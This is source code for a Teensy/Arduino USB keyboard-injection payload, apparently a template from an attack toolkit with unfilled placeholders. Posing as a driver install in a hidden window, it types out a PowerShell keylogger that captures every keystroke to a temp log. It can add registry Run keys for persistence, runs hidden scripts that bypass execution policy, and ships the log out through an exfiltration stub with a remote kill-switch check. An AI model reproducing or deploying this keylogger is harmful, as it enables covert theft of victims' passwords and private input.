#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){
  
 delay(3000);
  wait_for_drivers(2000);
  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  if ("y" == "INPUT7")
    {
    Keyboard.println("echo New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Update -PropertyType String -Value \"$env:TEMP\\kl.vbs\" -force > %temp%\\kl.ps1");
    Keyboard.println("echo New-ItemProperty -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Update64 -PropertyType String -Value \"$env:TEMP\\kp.vbs\" -force >> %temp%\\kp.ps1");
    Keyboard.println("echo $s = @' >> %temp%\\kl.ps1");
    }
  else
    {
      Keyboard.println("echo $s = @' > %temp%\\kl.ps1");
    }
  Keyboard.println("echo [DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] >> %temp%\\kl.ps1");
  Keyboard.println("echo public static extern short GetAsyncKeyState(int virtualKeyCode); >> %temp%\\kl.ps1");
  Keyboard.println("echo '@ >> %temp%\\kl.ps1");
  Keyboard.println("echo $gk = Add-Type -memberDefinition $s -name \"Win32GetState\" -namespace Win32Functions -passThru >> %temp%\\kl.ps1");
  Keyboard.println("echo $chk = 0 >> %temp%\\kl.ps1");
  Keyboard.println("echo while ($true) { >> %temp%\\kl.ps1");
  Keyboard.println("echo Sleep -Milliseconds 40 >> %temp%\\kl.ps1");
  Keyboard.println("echo $l = \"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo $r=\"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo $ss=\"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo $cs=\"\" >> %temp%\\kl.ps1");
  Keyboard.println("echo for ($ch=1;$ch -le 254;$ch++) >> %temp%\\kl.ps1");
  Keyboard.println("echo { >> %temp%\\kl.ps1");
  Keyboard.println("echo $vk = $ch >> %temp%\\kl.ps1");
  Keyboard.println("echo $l = $gk::GetAsyncKeyState($vk) >> %temp%\\kl.ps1");
  Keyboard.println("echo if ($l -eq -32767) >> %temp%\\kl.ps1");
  Keyboard.println("echo { >> %temp%\\kl.ps1");
  Keyboard.println("echo if(($vk -ge 48) -and ($vk -le 57)) >> %temp%\\kl.ps1");
  Keyboard.println("echo { >> %temp%\\kl.ps1");
  Keyboard.println("echo $lss = $gk::GetAsyncKeyState(160) >> %temp%\\kl.ps1");
  Keyboard.println("echo $rss = $gk::GetAsyncKeyState(161) >> %temp%\\kl.ps1");
  Keyboard.println("echo if(($lss -eq -32768) -or ($rss -eq -32768)) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = \"S-\" + $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo else { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk }} >> %temp%\\kl.ps1");
  Keyboard.println("echo elseif(($vk -ge 64) -and ($vk -le 90)) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $lss = $gk::GetAsyncKeyState(160) >> %temp%\\kl.ps1");
  Keyboard.println("echo $rss = $gk::GetAsyncKeyState(161) >> %temp%\\kl.ps1");
  Keyboard.println("echo $cs = [console]::CapsLock >> %temp%\\kl.ps1");
  Keyboard.println("echo if(!(($lss -eq -32768) -or ($rss -eq -32768)) -xor $cs) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = \"S-\" + $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo else {>> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk }} >> %temp%\\kl.ps1");
  Keyboard.println("echo elseif((($vk -ge 186) -and ($vk -le 192)) -or (($vk -ge 219) -and ($vk -le 222))) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $lss = $gk::GetAsyncKeyState(160) >> %temp%\\kl.ps1");
  Keyboard.println("echo $rss = $gk::GetAsyncKeyState(161) >> %temp%\\kl.ps1");
  Keyboard.println("echo if(($lss -eq -32768) -or ($rss -eq -32768)) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = \"S-\" + $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo else { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk }}>> %temp%\\kl.ps1");
  Keyboard.println("echo else { >> %temp%\\kl.ps1");
  Keyboard.println("echo $r = $vk } >> %temp%\\kl.ps1");
  Keyboard.println("echo $now = Get-Date; >> %temp%\\kl.ps1");
  Keyboard.println("echo $ll = \"$r \" >> %temp%\\kl.ps1");
  Keyboard.println("echo $fln = \"%temp%\\key.log\" >> %temp%\\kl.ps1");
  Keyboard.println("echo Out-File -FilePath $fln -Append -InputObject \"$ll\" }} >> %temp%\\kl.ps1");
  Keyboard.println("echo $chk++ >> %temp%\\kl.ps1");
  Keyboard.println("echo if($chk -eq 6000) { >> %temp%\\kl.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\kl.ps1");
  Keyboard.println("echo $fc = $wc.DownloadString(\"INPUT5\") >> %temp%\\kl.ps1");
  Keyboard.println("echo if($fc -eq \"INPUT6\") { break } >> %temp%\\kl.ps1");
  Keyboard.println("echo }} >> %temp%\\kl.ps1");  
  delay(2000);

  Keyboard.println("echo $ErrorActionPreference = \"SilentlyContinue\" > %temp%\\kp.ps1");
  Keyboard.println("echo $chk = 0 >> %temp%\\kp.ps1");
  Keyboard.println("echo $read = 0  >> %temp%\\kp.ps1");
  Keyboard.println("echo while($true) { >> %temp%\\kp.ps1");
  Keyboard.println("echo sleep INPUT4 >> %temp%\\kp.ps1");
  Keyboard.println("echo $now = Get-Date; >> %temp%\\kp.ps1");  
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Keylog:  \" +  $now.ToUniversalTime().ToString(\"dd/MM/yyyy HH:mm:ss:fff\")>> %temp%\\kp.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\kp.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\kp.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\kp.ps1");
  Keyboard.println("echo $pv=gc %temp%\\key.log >> %temp%\\kp.ps1"); 
  Keyboard.println("echo $read++ >> %temp%\\kp.ps1");
  Keyboard.println("echo if ($read -eq 30) { >> %temp%\\kp.ps1");
  Keyboard.println("echo Out-File -FilePath $env:temp\\key.log -Force -InputObject \" \" >> %temp%\\kp.ps1");
  Keyboard.println("echo $read = 0 } >> %temp%\\kp.ps1");

  String fn = "kp";
  EXFILCALLS

  
  Keyboard.println("echo $chk++ >> %temp%\\kp.ps1");
  Keyboard.println("echo if($chk -eq 100) { >> %temp%\\kp.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\kp.ps1");
  Keyboard.println("echo $fc = $wc.DownloadString(\"INPUT5\") >> %temp%\\kp.ps1");
  Keyboard.println("echo if($fc -eq \"INPUT6\") { break } >> %temp%\\kp.ps1");
  Keyboard.println("echo $chk=0 >> %temp%\\kp.ps1");
  Keyboard.println("echo }} >> %temp%\\kp.ps1");
  delay(2000);

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\kp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\kp.ps1\"),0,true >> %temp%\\kp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\kp.vbs");
  delay(3000);

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\kl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\kl.ps1\"),0,true >> %temp%\\kl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\kl.vbs");
  delay(3000);

  Keyboard.println("exit");

}

void loop(){
}

DEFS
EXFILDEFS